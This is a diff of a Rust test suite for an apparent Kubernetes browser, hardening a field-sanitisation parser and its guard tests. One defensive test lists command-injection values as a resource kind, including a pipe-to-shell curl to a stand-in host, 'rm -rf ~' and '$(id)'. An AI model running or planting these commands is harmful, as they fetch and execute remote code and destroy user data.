@@ -3073,45 +3073,176 @@ fn a_newline_a_real_kubelet_sent_becomes_a_space_and_never_glues_two_words() {
 const RULES_SOURCE: &str = include_str!("rules.rs");
 const K8S_SOURCE: &str = include_str!("k8s.rs");
 
-/// `pub struct Foo {` / `enum Foo {` — the name, for a type declared at the top level.
-fn type_header(line: &'static str) -> Option<&'static str> {
-    let rest = line
-        .strip_prefix("pub struct ")
-        .or_else(|| line.strip_prefix("struct "))
-        .or_else(|| line.strip_prefix("pub enum "))
-        .or_else(|| line.strip_prefix("enum "))?;
-    let name = rest.strip_suffix(" {")?;
-    (!name.contains(['<', ' '])).then_some(name)
+/// **A declaration with its visibility removed**, so one parser reads `pub`, `pub(crate)` and a
+/// private item alike.
+///
+/// **The spelling that was missing is `pub(crate)`, and the failure it caused was silence.**
+/// [`Browsable`] is `pub` and [`Happening`] is `pub(crate)`; a parser that knew only the first
+/// read the second's fields as *none at all*, so every derived guard below skipped that type and
+/// reported nothing — the shape CLAUDE.md § A derived list asserts it found something is named
+/// for (`dev-core`, 2026-08-31).
+///
+/// **A third spelling would go silent the same way, and what catches it is already here**:
+/// [`every_bounded_field_of_a_bounded_type_is_reached_by_its_parents_impl`] refuses an
+/// `impl Bounded` whose type this parser could not find, so any type that reaches the guard at all
+/// is named out loud rather than skipped. What that check cannot see — and what cost this turn a
+/// round — is a type with no impl yet, which is exactly the state a *new* surface arrives in.
+fn unqualified(line: &str) -> &str {
+    let Some(rest) = line.strip_prefix("pub") else {
+        return line;
+    };
+    let rest = match rest.starts_with('(') {
+        true => rest.split_once(')').map_or(rest, |(_, after)| after),
+        false => rest,
+    };
+    // **The space is what separates a visibility from a field called `public`.** Without it this
+    // reads `public: String` as `lic: String`, which is the silence it exists to remove wearing
+    // the other coat.
+    rest.strip_prefix(' ').unwrap_or(line)
 }
 
-/// One line of a type body as (field, type), covering struct fields, struct-like enum variants
-/// and tuple variants — for which the variant's own name stands in for a field name.
-fn field_of(line: &'static str) -> Option<(&'static str, &'static str)> {
-    let mut body = line.trim();
-    if body.starts_with("//") || body.starts_with('#') {
+/// **`struct Foo`, `enum Foo`, `struct Foo<T>`, `struct Foo<'a>` — the word after the keyword**,
+/// for any type declared at column 0, whatever it carries after its name.
+///
+/// **Generic declarations were refused until 2026-08-31** — `name.contains(['<', ' '])` was a `?`
+/// with no message — which took `Watch<T>` and `Trouble<'a>` out of every derived guard below
+/// without a word. Neither carries a `String` today; the point is that nothing would have said so
+/// if one did ([`every_type_the_product_files_declare_is_one_this_parser_found`], which is the
+/// test that found these two).
+fn declaration_name(rest: &'static str) -> &'static str {
+    rest.split_once(|character: char| !(character.is_alphanumeric() || character == '_'))
+        .map_or(rest, |(name, _)| name)
+}
+
+/// `pub struct Foo {` / `enum Foo {` — the name, for a type with a braced body.
+fn type_header(line: &'static str) -> Option<&'static str> {
+    let rest = unqualified(line)
+        .strip_prefix("struct ")
+        .or_else(|| unqualified(line).strip_prefix("enum "))?;
+    let name = declaration_name(rest.strip_suffix(" {")?);
+    (!name.is_empty()).then_some(name)
+}
+
+/// **`pub(crate) struct Document(serde_yaml_ng::Value);` — a tuple struct, whole, on one line**,
+/// as the name against its members numbered the way Rust names them.
+///
+/// **It is here because it was the second shape that went silent.** [`type_header`] wants a line
+/// ending in `{`, so a tuple struct was not a type this parser had ever heard of, and a
+/// `struct EventSource(pub(crate) String)` hung off a watched type passed every derived guard
+/// (`k8s-admin`, 2026-08-31). Two exist in the product files today — [`Document`] and
+/// `StandingBackoff` — and neither carries a `String`, which is why nothing was unstripped.
+///
+/// **`0` is a field name that works with no special case downstream**: [`words`] splits on
+/// non-alphanumerics and keeps a digit, so `text(&mut self.0, IDENTIFIER)` answers *is `0`
+/// bounded?* exactly the way `text(&mut self.name, …)` answers it for `name`.
+fn tuple_header(line: &'static str) -> Option<(&'static str, Vec<(&'static str, &'static str)>)> {
+    let rest = unqualified(line).strip_prefix("struct ")?;
+    let (head, members) = rest.split_once('(')?;
+    let members = members.strip_suffix(");")?;
+    // `LogSocket<R>` is a tuple struct *and* generic, which is the shape that made
+    // [`every_type_the_product_files_declare_is_one_this_parser_found`] earn its keep the same
+    // hour it was written (`dev-core`, 2026-08-31).
+    let name = declaration_name(head);
+    if name.is_empty() || head.contains(' ') {
         return None;
     }
-    // `Running { started_at: Option<Time> },`
+    let members = at_top_level(members)
+        .into_iter()
+        .enumerate()
+        .map(|(at, member)| {
+            let index = INDEX.get(at).unwrap_or_else(|| {
+                panic!(
+                    "{name} is a tuple struct with more than {} members, which this parser stops \
+                     understanding rather than half-reads — give it more names in INDEX",
+                    INDEX.len()
+                )
+            });
+            (*index, unqualified(member.trim()))
+        })
+        .collect();
+    Some((name, members))
+}
+
+/// The names Rust gives a tuple struct's members, as far as this parser will read one.
+///
+/// **Four, because that is more than any tuple struct in this repo has and a fifth is a shape
+/// nobody has written**: [`tuple_header`] would panic on it rather than skip it, which is the
+/// behaviour this file wants of a parser that stops understanding its input.
+const INDEX: [&str; 4] = ["0", "1", "2", "3"];
+
+/// **Splits a declaration on the commas that separate its *members*** — the ones outside every
+/// `<…>`, `(…)` and `[…]`.
+///
+/// `BTreeMap<String, String>` carries a comma that separates nothing, and `fn(&mut Store) -> &mut
+/// Watch<T>` — a real field of `NamedStream` — carries a `>` that closes nothing, which is why the
+/// arrow is excluded by hand rather than by hoping no field has one.
+fn at_top_level(body: &'static str) -> Vec<&'static str> {
+    let mut parts = Vec::new();
+    let mut depth = 0_i32;
+    let mut start = 0;
+    for (at, character) in body.char_indices() {
+        match character {
+            '<' | '(' | '[' => depth += 1,
+            '>' if !body[..at].ends_with('-') => depth -= 1,
+            ')' | ']' => depth -= 1,
+            ',' if depth == 0 => {
+                parts.push(&body[start..at]);
+                start = at + 1;
+            }
+            _ => {}
+        }
+    }
+    parts.push(&body[start..]);
+    parts
+}
+
+/// **One line of a type body as its (field, type) pairs** — struct fields, struct-like enum
+/// variants and tuple variants, for which the variant's own name stands in for a field name.
+///
+/// **Plural, and that is the third shape that went silent.** A struct-like variant fits on one
+/// line whenever `rustfmt` can fit it, and this took the first field and dropped every one after
+/// it: collapsing `ContainerState::Waiting` onto one line — a formatting change, semantics
+/// identical — moved the derived field count 52 → 51, and `message` could then be dropped from
+/// that variant's `Bounded` arm with all ten derived guards green over an unbounded `String` on a
+/// watched snapshot type (`tester`, 2026-08-31). Today's `Waiting` is multi-line by eleven
+/// characters of `struct_variant_width` and by nothing else, so this was one `cargo fmt` away.
+fn fields_of(line: &'static str) -> Vec<(&'static str, &'static str)> {
+    let body = line.trim();
+    if body.starts_with("//") || body.starts_with('#') {
+        return Vec::new();
+    }
+    // `Running { started_at: Option<Time> },` — and every field after the first, which is the
+    // half that was missing.
     if let Some((head, rest)) = body.split_once(" { ")
         && head.starts_with(char::is_uppercase)
     {
-        body = rest;
+        let rest = rest.trim_end_matches(',').trim_end().trim_end_matches('}');
+        return at_top_level(rest)
+            .into_iter()
+            .filter_map(one_field)
+            .collect();
     }
     // `Other(String),`
     if let Some((name, rest)) = body.split_once('(')
         && let Some(inner) = rest.strip_suffix("),")
         && name.starts_with(char::is_uppercase)
     {
-        return Some((name, inner));
+        return vec![(name, inner)];
     }
+    one_field(body).into_iter().collect()
+}
+
+/// `name: Type` — one field, however it was reached.
+fn one_field(body: &'static str) -> Option<(&'static str, &'static str)> {
     let body = body
+        .trim()
         .trim_end_matches(',')
         .trim_end()
         .trim_end_matches('}')
         .trim_end();
     let (name, kind) = body.split_once(": ")?;
-    let name = name.strip_prefix("pub ").unwrap_or(name);
-    (!name.contains(' ')).then_some((name, kind))
+    let name = unqualified(name.trim());
+    (!name.contains(' ')).then_some((name, kind.trim()))
 }
 
 /// Every type one source file declares, with its fields. `rules.rs` for the snapshot types
@@ -3122,6 +3253,10 @@ fn declared_types(
     let mut types = BTreeMap::new();
     let mut open: Option<(&'static str, Vec<(&'static str, &'static str)>)> = None;
     for line in source.lines() {
+        if let Some((name, members)) = tuple_header(line) {
+            types.insert(name, members);
+            continue;
+        }
         if let Some(name) = type_header(line) {
             open = Some((name, Vec::new()));
             continue;
@@ -3134,11 +3269,199 @@ fn declared_types(
             types.insert(name, fields);
             continue;
         }
-        if let Some(field) = field_of(line) {
-            open.as_mut().expect("a type is open").1.push(field);
-        }
+        open.as_mut()
+            .expect("a type is open")
+            .1
+            .extend(fields_of(line));
     }
     types
+}
+
+/// **The parser itself, over every declaration shape this repo writes or `rustfmt` can produce** —
+/// the `--self-test` the guards in `scripts/` all carry, in-tree, for the parser all ten derived
+/// guards rest on.
+///
+/// **Three of these shapes returned nothing and said nothing** (`tester` and `k8s-admin`,
+/// 2026-08-31). Two are covered by
+/// [`every_type_the_product_files_declare_is_one_this_parser_found`] because they are whole
+/// declarations; the third cannot be, because it is a *field* that goes missing out of a type the
+/// parser did find, and no count of declarations can see it.
+///
+/// **The one-line struct variant is the one worth spelling out.** `ContainerState::Waiting` is
+/// multi-line today by eleven characters of `struct_variant_width` and by no rule at all; collapse
+/// it — a formatting change, semantics identical — and this parser took `reason` and dropped
+/// `message`, at which point `maybe(message, FREE_TEXT)` could be deleted from that variant's
+/// `Bounded` arm with all ten derived guards green over an unbounded `String` on a watched
+/// snapshot type. **It is fed here rather than by reformatting `rules.rs`**, which is frozen
+/// (CLAUDE.md § Pyramid phases) — and a pure function over a `&'static str` is a better subject
+/// than a file edit anyway.
+///
+/// **The commas inside a type are the reason [`at_top_level`] exists**: `BTreeMap<String, String>`
+/// carries one that separates nothing, and `NamedStream::of` is `fn(&mut Store) -> &mut Watch<T>`,
+/// whose `>` closes nothing.
+#[test]
+fn the_parser_reads_every_declaration_shape_this_repo_can_write() {
+    for (line, expected) in [
+        // A struct field, both visibilities and none.
+        ("    pub name: String,", vec![("name", "String")]),
+        (
+            "    pub(crate) at: Option<Time>,",
+            vec![("at", "Option<Time>")],
+        ),
+        (
+            "    live: BTreeMap<Key, T>,",
+            vec![("live", "BTreeMap<Key, T>")],
+        ),
+        // A field whose type carries an arrow and a comma that separate nothing.
+        (
+            "    of: fn(&mut Store) -> &mut Watch<T>,",
+            vec![("of", "fn(&mut Store) -> &mut Watch<T>")],
+        ),
+        // The struct-like enum variant, as written and as `rustfmt` would collapse it.
+        (
+            "        reason: Option<String>,",
+            vec![("reason", "Option<String>")],
+        ),
+        (
+            "    Waiting { reason: Option<String>, message: Option<String> },",
+            vec![("reason", "Option<String>"), ("message", "Option<String>")],
+        ),
+        (
+            "    Held { labels: BTreeMap<String, String>, at: Option<Time> },",
+            vec![
+                ("labels", "BTreeMap<String, String>"),
+                ("at", "Option<Time>"),
+            ],
+        ),
+        // **The arrow inside a variant, which is the one row [`at_top_level`]'s `-` condition is
+        // for.** A plain struct field carrying one — `NamedStream::of` — reaches [`one_field`] and
+        // never that function, so without this row the condition was a branch no test could fail
+        // (measured: deleting it left the whole suite green — `dev-core`'s second pass,
+        // 2026-08-31).
+        (
+            "    Held { of: fn(&Store) -> &Watch, at: Option<Time> },",
+            vec![("of", "fn(&Store) -> &Watch"), ("at", "Option<Time>")],
+        ),
+        // A tuple variant, whose own name stands in for a field name.
+        ("    Other(String),", vec![("Other", "String")]),
+        // Not fields.
+        (
+            "    /// A doc comment naming reason: Option<String>",
+            vec![],
+        ),
+        ("    #[serde(default)]", vec![]),
+    ] {
+        assert_eq!(
+            fields_of(line),
+            expected,
+            "the parser read {line:?} as something other than its fields"
+        );
+    }
+
+    // Whole declarations, including the three shapes that were silent.
+    for (line, name) in [
+        ("pub struct Browsable {", Some("Browsable")),
+        ("pub(crate) struct Happening {", Some("Happening")),
+        ("pub(super) struct Whatever {", Some("Whatever")),
+        ("struct Watch<T> {", Some("Watch")),
+        ("pub struct Trouble<'a> {", Some("Trouble")),
+        ("pub(crate) enum ObjectKind {", Some("ObjectKind")),
+        ("impl Bounded for Row {", None),
+    ] {
+        assert_eq!(
+            type_header(line),
+            name,
+            "the parser read the declaration {line:?} wrongly"
+        );
+    }
+    assert_eq!(
+        tuple_header("pub(crate) struct Document(serde_yaml_ng::Value);"),
+        Some(("Document", vec![("0", "serde_yaml_ng::Value")])),
+        "a tuple struct is still a type the parser does not know"
+    );
+    assert_eq!(
+        tuple_header("pub(crate) struct Pair(pub(crate) String, u8);"),
+        Some(("Pair", vec![("0", "String"), ("1", "u8")])),
+        "a tuple struct's members after the first are dropped"
+    );
+    assert_eq!(
+        tuple_header("struct Handler(fn(&Store) -> bool, String);"),
+        Some((
+            "Handler",
+            vec![("0", "fn(&Store) -> bool"), ("1", "String")]
+        )),
+        "an arrow in a tuple struct's first member swallowed the member after it"
+    );
+
+    // **A field called `public` is not a visibility**, which is what the space in `unqualified`
+    // buys and what a `strip_prefix("pub")` alone would eat.
+    assert_eq!(
+        fields_of("    public: String,"),
+        vec![("public", "String")],
+        "a field whose name starts with `pub` was read as a visibility"
+    );
+}
+
+/// **Every type the two product files declare is one this parser found** — the guard that turns a
+/// declaration shape it does not understand into a red build instead of a skipped type.
+///
+/// **This is the class, and three instances of it were shipped in one turn.** Every derived guard
+/// below asks *does the ingest guard name this type's strings*, and each of them answers *yes,
+/// vacuously* for a type [`declared_types`] returned nothing for. A `pub(crate) struct`, a
+/// `pub(super) struct` and a tuple struct each went silent that way, and the sweep that found them
+/// had to plant a type per shape to see it (`tester` and `k8s-admin`, independently, 2026-08-31).
+/// A count that has to be *derived* from the source is a count that can go to zero without a word,
+/// which is CLAUDE.md § A derived list asserts it found something one level up: not *did this
+/// guard find fields*, but *did the parser under every guard find the type at all*.
+///
+/// **It reads the declaration lines with a pattern the parser does not share**, or it would agree
+/// with the thing it is checking. What it matches is *anything at column 0 that declares a type*,
+/// however spelled; what it demands is that the parser produced a key for it.
+///
+/// **Seen red before trusted**: `pub(super) struct EventSource { component: String }` added to
+/// `k8s.rs` fails this naming `EventSource`, where before this test the whole suite stayed green
+/// (`dev-core`, 2026-08-31).
+#[test]
+fn every_type_the_product_files_declare_is_one_this_parser_found() {
+    let mut unparsed = Vec::new();
+    let mut found = 0;
+    for (file, source) in [("rules.rs", RULES_SOURCE), ("k8s.rs", K8S_SOURCE)] {
+        let types = declared_types(source);
+        for line in source.lines() {
+            // Column 0 only: a type declared inside a function body is nothing any guard here
+            // reads, and `rules.rs` has none anyway.
+            // **Split into words rather than run through [`unqualified`]**, which is the parser
+            // this is checking: sharing that function is how the first draft of this guard stayed
+            // green over the `pub(super)` shape it was written to catch (`dev-core`, 2026-08-31).
+            // Any leading word beginning `pub` is a visibility, however it is spelled.
+            if line.starts_with(char::is_whitespace) {
+                continue;
+            }
+            let mut words = line.split_whitespace();
+            let mut word = words.next();
+            if word.is_some_and(|word| word.starts_with("pub")) {
+                word = words.next();
+            }
+            if !matches!(word, Some("struct" | "enum")) {
+                continue;
+            }
+            let Some(rest) = words.next() else { continue };
+            found += 1;
+            if !types.contains_key(declaration_name(rest)) {
+                unparsed.push(format!("{file}: {}", line.trim()));
+            }
+        }
+    }
+    println!("{found} type declarations across rules.rs and k8s.rs, all parsed");
+    assert!(
+        found > 60,
+        "only {found} declarations were matched, so this guard is reading the wrong place"
+    );
+    assert!(
+        unparsed.is_empty(),
+        "these types are declared in a product file and this file's parser returns nothing for \
+         them, so every derived guard below skips them and passes: {unparsed:?}"
+    );
 }
 
 /// Splits a line of Rust into the words a field name could be.
@@ -3179,14 +3502,30 @@ fn code_only(source: &str) -> String {
         .join("\n")
 }
 
+/// **The body of one top-level item, comments stripped** ([`code_only`]) — everything between the
+/// `{` that opens whatever `head` names and the `}` in column 0 that closes it.
+///
+/// **One finder for an `impl` block and for a `fn`**, because two guards below ask the same
+/// question of the same file and a second copy of it is the second place a widening gets
+/// forgotten (CLAUDE.md § never write the same code twice).
+///
+/// **`head` stops before the brace on purpose.** It is matched literally and the first `{` *after*
+/// it opens the body, so a multi-line signature — [`read_lines`]' three lines of it — is walked
+/// past without this having to parse one.
+fn body_of(source: &str, head: &str) -> Option<String> {
+    let at = source.find(head)? + head.len();
+    let rest = &source[at..];
+    let body = &rest[rest.find("{\n")? + 2..];
+    Some(code_only(&body[..body.find("\n}\n")?]))
+}
+
 /// The body of `impl Bounded for <type>`, comments stripped ([`code_only`]), or `None` if there is
 /// no such impl.
+///
+/// **The trailing space in the head is what keeps `ObjectId` from matching an `ObjectIdSomething`**
+/// that does not exist today and would be read as the wrong body if it did.
 fn bounded_impl(type_name: &str) -> Option<String> {
-    let region = guard_region();
-    let head = format!("\nimpl Bounded for {type_name} {{\n");
-    let at = region.find(&head)? + head.len();
-    let rest = &region[at..];
-    Some(code_only(&rest[..rest.find("\n}\n")?]))
+    body_of(guard_region(), &format!("\nimpl Bounded for {type_name} "))
 }
 
 /// Every `impl Bounded for X` in the guard region, as the type's name against its body with
@@ -5809,6 +6148,38 @@ fn a_kind_whose_own_words_cannot_build_a_url_is_never_fetched() {
             Fetch::table(&kind, None),
             None,
             "a plural the guard rewrote was still used to build a URL"
+        );
+    }
+
+    // **The kind, whose group, version and plural are all ordinary** — the one word here that
+    // builds no path segment and is judged anyway, because `main.rs` lowercases it into the
+    // `$ kubectl get …` line and a reader runs that line in a shell (`Fetch::table`'s doc,
+    // `k8s-admin` 2026-08-31). The first payload is the one that was measured printing
+    // `$ kubectl get pod; curl http://evil.invalid/x | sh # web -n default …`.
+    for hostile in [
+        "pod; curl http://evil.invalid/x | sh #",
+        "pod && rm -rf ~",
+        "pod$(id)",
+        "pod`id`",
+        "pod\u{1b}[2J",
+        "pod/../secrets",
+        "",
+    ] {
+        let kind = browsed("example.com", "v1", hostile, "widgets", Scope::Namespaced);
+        println!(
+            "hostile kind: {:?} -> {:?}",
+            kind.kind,
+            Fetch::table(&kind, None)
+        );
+        assert_eq!(
+            Fetch::table(&kind, Some("kube-system")),
+            None,
+            "a kind of {hostile:?} built a fetch, so `--yaml` prints it into a `$ kubectl` \
+             line the reader is told to run"
+        );
+        assert!(
+            Browsing::open(kind, Some("kube-system")).is_none(),
+            "a view opened on a kind that cannot go on a command line"
         );
     }
 
@@ -13071,7 +13442,7 @@ impl AsyncRead for Feed {
 /// asserts the read finished, so a test of the *lines* cannot pass over a stream that broke.
 async fn lines_of(feed: Feed) -> Vec<String> {
     let mut got = Vec::new();
-    read_lines(feed, |line| {
+    read_lines(LogSocket::over(feed), |line| {
         got.push(line);
         true
     })
@@ -13083,7 +13454,7 @@ async fn lines_of(feed: Feed) -> Vec<String> {
 /// What [`read_lines`] over these bytes leaves in a [`LogLines`].
 async fn held(feed: Feed) -> LogLines {
     let mut held = LogLines::default();
-    read_lines(feed, |line| {
+    read_lines(LogSocket::over(feed), |line| {
         held.push(line);
         true
     })
@@ -13671,7 +14042,7 @@ async fn the_last_line_arrives_with_or_without_a_newline_after_it() {
 #[tokio::test]
 async fn a_caller_that_stops_reading_stops_the_stream() {
     let mut got = Vec::new();
-    read_lines(Feed::whole(b"one\ntwo\nthree\n"), |line| {
+    read_lines(LogSocket::over(Feed::whole(b"one\ntwo\nthree\n")), |line| {
         got.push(line);
         false
     })
@@ -13696,7 +14067,7 @@ async fn a_caller_that_stops_reading_stops_the_stream() {
 async fn a_stream_that_broke_hands_over_what_arrived_and_says_it_broke() {
     let mut got = Vec::new();
     let read = read_lines(
-        Feed::broken(b"connected to postgres\nwriting check"),
+        LogSocket::over(Feed::broken(b"connected to postgres\nwriting check")),
         |line| {
             got.push(line);
             true
@@ -13809,8 +14180,8 @@ fn the_names_a_log_request_carries_are_stripped_before_either_record_is_made() {
 
 /// Everything a reader hands back, as bytes — the shortest way to put a real body through
 /// [`read_lines`] in a test.
-async fn read_whole(reader: impl AsyncRead) -> Vec<u8> {
-    let mut reader = Box::pin(reader);
+async fn read_whole<R: AsyncRead>(socket: LogSocket<R>) -> Vec<u8> {
+    let mut reader = Box::pin(socket.0);
     let mut whole = Vec::new();
     let mut chunk = [0_u8; 512];
     while let Ok(read @ 1..) = reader.read(&mut chunk).await {
@@ -14429,6 +14800,45 @@ async fn an_events_words_are_stripped_before_anything_can_draw_them() {
     assert_eq!(
         happened.lines[0].message, "secret \"prodterces\" not found",
         "a control character survived into the message a pane draws"
+    );
+}
+
+/// **An event's message is disposed of as a *cell* and never as a document** — the half
+/// [`Bounded for Happening`](Happening) argues at length and that nothing fed until now.
+///
+/// **The doc was the only thing holding it.** `text` substitutes one space for an unprintable
+/// whitespace character and [`clean`] keeps it (NOTES § D146, § D198), and both are right on their
+/// own surface — but no test put a `\n`, a `\t` or a `\r` into an event message, so swapping this
+/// field to the document's retention left **845 tests green** with a controller's newline free to
+/// open a row that looks like a second event (`k8s-admin`, 2026-08-31). `cargo mutants` cannot see
+/// it either: it deletes a body, it does not substitute one plausible strip for another.
+///
+/// **All three, and a run of them**, because `text`'s rule is *one* space between two kept
+/// characters however the break was spelled — a `\r\n` is one boundary and not two, and a
+/// trailing one separated the value from nothing and is dropped.
+#[tokio::test]
+async fn an_events_message_is_disposed_of_as_a_cell_and_not_as_a_document() {
+    let (client, _) = stub_list(
+        "200 OK",
+        event_list(
+            vec![event(
+                "Unhealthy",
+                "line one\nline two\ttabbed\r\nthird\n",
+                Some("2026-08-19T10:00:00Z"),
+            )],
+            false,
+        ),
+    )
+    .await;
+    let happened = events(&client, "payments", "Pod", "web", None)
+        .await
+        .expect("the server answered");
+
+    println!("kept: {:?}", happened.lines[0].message);
+    assert_eq!(
+        happened.lines[0].message, "line one line two tabbed third",
+        "an event's message keeps a line break, so a controller can draw a row that looks like a \
+         second event — the document's rule (NOTES § D198) applied to a cell"
     );
 }
 
@@ -15263,5 +15673,548 @@ async fn a_windows_line_ending_survives_as_the_bytes_the_cluster_holds() {
         !printed.contains('\r'),
         "a raw carriage return reached the document, which moves the cursor to column 0 and \
          overwrites the line above it: {printed:?}"
+    );
+}
+
+// --- THE THREE SURFACES THAT GREW AFTER THE DERIVED GUARD ---
+//
+// **Three read paths landed after § THE FIELD LIST, DERIVED RATHER THAN TYPED was written, and
+// each arrived with a spot test and no derived guard**: one container's log, one object's events,
+// and the untyped document. A spot test proves *today's* fields are stripped — the field a box
+// adds next month ships unstripped and every one of them stays green, which is the exact failure
+// that section exists to refuse (todo.md § Phase 6, PRIOR-ART § D1).
+//
+// **Each gets the guard its own shape allows, and they are three different shapes.** The events
+// fetch has declared fields, so it joins the derived walk above and costs one call. The document
+// has no declared fields at all, so what is guarded is the *traversal*: a second walk of the tree,
+// exhaustive over `serde_yaml_ng::Value` by the compiler rather than by a list.
+//
+// **The log stream has two guards, and the one that matters is not in this file.** A source guard
+// over [`read_lines`] is below and holds one half — every line that function hands a caller came
+// out of [`log_line`]. It could not hold the other, and a review proved it by leaving that
+// function alone and rewriting `main.rs`'s `--follow` arm to decode the socket itself: 868 tests
+// green with that path going through neither [`text`] nor the [`FREE_TEXT`] cut nor
+// [`LINE_READ`]'s ceiling (`k8s-admin`, 2026-08-31). What closes it is [`LogSocket`], whose field
+// is private to `k8s.rs` — the compiler, not a test that reads text.
+
+/// **Every `String` an events fetch keeps is named by the ingest guard** — [`Happened`] and
+/// everything it reaches, derived off `k8s.rs` rather than typed out here.
+///
+/// **The root is [`Happened`] and not [`Happening`]**, so the envelope is covered too: a `String`
+/// added beside the lines — a namespace, a continue token — is as much free text the API wrote as
+/// the message is, and rooting the walk at the inner type is how that half stays invisible.
+///
+/// **Seen red before trusted, twice** (CLAUDE.md). Run against the tree before
+/// [`Bounded for Happening`](Happening) existed it failed with *Happening carries ["reason",
+/// "message"] and k8s.rs has no `impl Bounded` for it* — and with the impl in place, a
+/// `source: String` planted on [`Happening`] and filled from the wire fails it with
+/// *Happening.source is a String an events fetch keeps and the ingest guard never names it*, which
+/// is the box's own claim about next month's field, run rather than argued (`dev-core`,
+/// 2026-08-31).
+#[test]
+fn every_string_an_events_fetch_keeps_is_named_by_the_ingest_guard() {
+    // **Both files, as every sibling guard does.** [`Happening`] is declared in `k8s.rs` and its
+    // fields need not be: a field whose type `rules.rs` declares was invisible to this walk *and*
+    // to the chain guard while this read one source (`k8s-admin`, 2026-08-31). The two files
+    // declare no name in common, so the merge order settles nothing.
+    let mut types = declared_types(RULES_SOURCE);
+    types.extend(declared_types(K8S_SOURCE));
+    let reachable = reachable_from(&types, vec!["Happened"]);
+    assert!(
+        reachable.contains("Happening"),
+        "the walk did not reach Happening from Happened, so this guard is reading nothing: \
+         {reachable:?}"
+    );
+    let checked = assert_the_guard_names_every_string(&types, &reachable, "an events fetch keeps");
+    for named_by_the_screen in ["Happening.reason", "Happening.message"] {
+        assert!(
+            checked.iter().any(|found| found == named_by_the_screen),
+            "{named_by_the_screen} was not among {checked:?}, so this guard is looking in the \
+             wrong place"
+        );
+    }
+    println!(
+        "bounded, derived off rules.rs and k8s.rs: {}",
+        checked.join(" · ")
+    );
+}
+
+/// **Every line [`read_lines`] hands a caller came out of [`log_line`]** — the log stream's
+/// version of the derived field list, read off the source because no type can say it.
+///
+/// **What a field guard cannot see here.** [`LogLines`] holds one text field and has one door, so
+/// the failure to close is not a field somebody forgot to name: it is a *second producer* — one
+/// more `line(...)` beside the two the loop has, handing over bytes that went through neither the
+/// strip nor the [`FREE_TEXT`] bound and reading exactly like the two that did.
+/// [`a_log_line_is_stripped_of_what_cannot_print_and_keeps_what_can`] stays green over that,
+/// because it feeds the loop bytes that leave through the *first* call site.
+///
+/// **This is the inside of the door and [`LogSocket`] is the door itself.** A caller that never
+/// calls [`read_lines`] at all is invisible here and was a live hole until the socket got a
+/// private field; that half is the compiler's now, which is why this test does not try to read
+/// `main.rs` (`k8s-admin`, 2026-08-31).
+///
+/// **Fed a planted violation and watched fail** (CLAUDE.md § Seen red before trusted): the
+/// trailing call site rewritten to `line(String::from_utf8_lossy(&held).into_owned())` fails this
+/// naming that argument; put back, nothing is reported (`dev-core`, 2026-08-31).
+///
+/// **The count is asserted as well as the shape**, because a guard that found no call sites at all
+/// passes every assertion under it (CLAUDE.md § A derived list asserts it found something).
+#[test]
+fn every_line_a_log_stream_hands_over_came_out_of_the_strip() {
+    let body = body_of(K8S_SOURCE, "pub(crate) async fn read_lines")
+        .expect("k8s.rs no longer declares read_lines, or declares it differently");
+    let mut handed = Vec::new();
+    for (at, _) in body.match_indices("line(") {
+        // `log_line(` ends in the same five characters and is the *answer* rather than the
+        // question, so only a call to the callback's own binding is collected.
+        if body[..at]
+            .chars()
+            .next_back()
+            .is_some_and(|before| before.is_alphanumeric() || before == '_')
+        {
+            continue;
+        }
+        let argument = &body[at + "line(".len()..];
+        handed.push(argument.lines().next().unwrap_or_default().to_string());
+    }
+    println!("read_lines hands its caller: {handed:?}");
+    assert_eq!(
+        handed.len(),
+        2,
+        "read_lines calls its callback {} time(s) and this guard was written for the two the loop \
+         has — a call site it cannot see is one it cannot check: {handed:?}",
+        handed.len()
+    );
+    for argument in &handed {
+        assert!(
+            argument.starts_with("log_line("),
+            "read_lines hands its caller `{argument}`, which went through neither the strip \
+             (invariant 9) nor the {FREE_TEXT}-byte bound"
+        );
+    }
+}
+
+/// **Every string in a `serde_yaml_ng::Value`, wherever it sits, and how many `!Tag`s were passed
+/// on the way** — the walk this file checks [`clean`]'s against.
+///
+/// **Two traversals, or the check is the thing it is checking.** A guard that reused `clean`'s own
+/// recursion would agree with it about which positions exist, which is the one thing it must not:
+/// the failure it is here to catch is a position `clean` does not visit.
+///
+/// **Exhaustive by the compiler, in both walks.** `serde_yaml_ng::Value` is not
+/// `#[non_exhaustive]`, so a variant added to it is a build failure here and in [`clean`] both,
+/// rather than a string nobody walks. That is the whole of the structural guard an untyped tree
+/// can have — there is no field list to derive.
+///
+/// **A tag's own text is collected as a string**, because it is one: `!Thing` is written by
+/// whoever wrote the document.
+fn every_string(value: &serde_yaml_ng::Value, found: &mut Vec<String>) -> usize {
+    match value {
+        serde_yaml_ng::Value::String(held) => {
+            found.push(held.clone());
+            0
+        }
+        serde_yaml_ng::Value::Sequence(held) => {
+            held.iter().map(|item| every_string(item, found)).sum()
+        }
+        serde_yaml_ng::Value::Mapping(held) => held
+            .iter()
+            .map(|(key, inner)| every_string(key, found) + every_string(inner, found))
+            .sum(),
+        serde_yaml_ng::Value::Tagged(tagged) => {
+            found.push(tagged.tag.to_string());
+            1 + every_string(&tagged.value, found)
+        }
+        serde_yaml_ng::Value::Null
+        | serde_yaml_ng::Value::Bool(_)
+        | serde_yaml_ng::Value::Number(_) => 0,
+    }
+}
+
+/// What [`every_string`] found that still has no printed form of its own — [`document_break`]'s
+/// three excepted, which are what a document keeps and a cell does not (NOTES § D198).
+fn still_unprintable(value: &serde_yaml_ng::Value) -> Vec<String> {
+    let mut found = Vec::new();
+    every_string(value, &mut found);
+    found
+        .into_iter()
+        .filter(|held| {
+            held.chars()
+                .any(|character| unprintable(character) && !document_break(character))
+        })
+        .collect()
+}
+
+/// **A string in every position a document can hold one, through [`clean`]** — the document's
+/// share of the derived field list, and the one of the three surfaces that cannot have a field
+/// list at all: [`Document`] wraps an untyped tree and there is nothing declared to enumerate.
+///
+/// **Five positions, because a guard is proven only for the shapes it was fed** (NOTES § D29): a
+/// map *value*, a map *key*, an element of a sequence, a map nested inside a sequence inside a
+/// map, and a `!Tag`'s value. Every one but the last is built the way the real read builds one —
+/// `serde_json` into a `serde_yaml_ng::Value`, which is what `Client::request` does.
+///
+/// **The `!Tag` is the position no JSON body can reach, and that is measured here rather than read
+/// off the type.** Four adversarial bodies — a key spelled `!Thing`, one nested, one in a
+/// sequence, one as a whole scalar — all decode to plain mappings and strings, because `Value`'s
+/// `Deserialize` only builds a `Tagged` from `visit_enum` and serde_json's `deserialize_any` never
+/// calls it. The arm exists so a `serde_yaml_ng` that grows one more variant is a build failure
+/// instead of a silent `_ => {}`, and it is exercised here through the YAML parser, which is the
+/// only thing that can make one.
